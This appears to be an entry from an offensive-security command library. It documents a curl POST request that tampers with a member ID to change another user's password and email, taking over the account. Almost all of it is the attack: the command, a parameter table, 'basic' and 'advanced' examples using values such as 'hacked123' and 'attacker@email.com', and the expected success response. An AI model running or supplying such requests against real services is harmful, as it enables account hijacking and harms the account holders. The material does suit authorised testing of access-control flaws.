---
data: >-
  curl -X POST 'https://target.com/█████████' -H 'Content-Type:
  application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"member_id":
  "VICTIM_ID", "new_password": "ATTACKER_PASSWORD"}'
tags:
  - web
  - post
  - takeover
type: command
output: |-
  HTTP/1.1 200 OK
  {"updated": true}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-05T12:00:00Z'
updated_at: '2025-12-14T17:33:24.280Z'
id: 960d30fa-a384-4145-9b46-47d7c2aaa262
verified: false
validated: true
submitted: true
---
# curl-submit-takeover-request

## Command

```bash
curl -X POST 'https://target.com/█████████' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"member_id": "VICTIM_ID", "new_password": "ATTACKER_PASSWORD"}'
```

## Description

This command submits a tampered POST to modify the victim's account, such as changing the password for takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `'https://target.com/█████████'` | Target endpoint URL | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON body type | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header | Yes |
| `-d '{"member_id": "VICTIM_ID", "new_password": "ATTACKER_PASSWORD"}'` | Body with tamper and update | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/█████████' -H 'Content-Type: application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"member_id": "456", "new_password": "hacked123"}'
```

### Advanced Usage

```bash
curl -v -X POST 'https://target.com/█████████' -H 'Content-Type: application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"member_id": "456", "new_password": "hacked123", "email": "attacker@email.com"}'
```

## Expected Output

200 OK confirming update, e.g., {"updated": true}.

## Related

- [[Related Procedure|procedures/Submit-Tampered-Request-for-Account-Takeover]]
